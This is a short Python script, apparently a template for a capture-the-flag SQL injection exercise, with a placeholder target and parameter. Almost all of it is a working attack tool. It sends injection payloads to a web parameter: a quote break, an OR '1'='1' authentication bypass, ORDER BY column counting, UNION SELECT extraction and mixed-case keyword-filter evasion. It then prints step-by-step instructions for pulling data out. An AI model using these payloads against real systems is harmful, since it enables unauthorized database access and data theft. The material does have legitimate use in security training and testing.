#
# Whitebox edge: you have the query. Read the exact string concatenation at
# {{LOCATION}} to know column count, quote style, and any keyword filter
# (remember mixed-case uNioN SELECt bypasses naive filters).
import urllib.parse
import urllib.request

BASE = "http://TARGET:PORT"   # TODO
PARAM = "id"                  # TODO: injectable param

PAYLOADS = [
    "1'",                                   # error / quote break
    "1' OR '1'='1",                         # auth-bypass style
    "1' ORDER BY 1-- -",                    # column count discovery (increment)
    "1' UNION SELECT 1-- -",                # adjust column count to match query
    "1' uNiOn SeLeCt 1,2,3-- -",            # mixed-case to dodge keyword filters
]


def send(payload: str) -> str:
    url = f"{BASE}/?{urllib.parse.urlencode({PARAM: payload})}"
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read().decode(errors="replace")


def main():
    for p in PAYLOADS:
        try:
            body = send(p)
            print(f"[?] {p:<40} len={len(body)}")
        except Exception as e:
            print(f"[-] {p:<40} {e}")
    print("\nStep 1: find column count via ORDER BY N until it errors.")
    print("Step 2: UNION SELECT that many cols, put data in a reflected one.")
    print("Step 3: pull the flag: mixed-case union if a WORD filter is present.")


if __name__ == "__main__":
    main()
